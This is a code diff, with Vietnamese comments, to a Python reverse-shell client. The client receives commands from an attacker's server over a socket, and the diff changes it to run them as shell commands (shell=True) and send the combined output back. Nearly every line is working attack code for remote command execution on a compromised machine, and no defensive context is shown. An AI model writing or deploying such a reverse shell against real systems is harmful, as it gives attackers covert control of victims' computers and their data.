@@ -14,7 +14,7 @@ def reverse_shell():
     # Vòng lặp chính để nhận và thực thi lệnh
     while True:
         # 2. Nhận lệnh từ Server (Attacker)
-        command = s.recv(1024).decode('utf-8').strip()
+        command = s.recv(1024).decode('utf-8')
 
         if not command or command.lower() == 'exit':
             s.send(b"[!] Closing.\n")
@@ -23,14 +23,10 @@ def reverse_shell():
         # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
         try:
             # Khởi tạo tiến trình con
-            output = subprocess.run(
-                command,
-                check=True,
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ...
+            # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
+            # Redirect stderr ra stdout
+            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ... nhưng đã dùng redirect để lấy cả stdout và stderr
             s.sendall(output.stdout)
         except Exception as e:
             s.send(f"[-] Error: {str(e)}".encode('utf-8'))
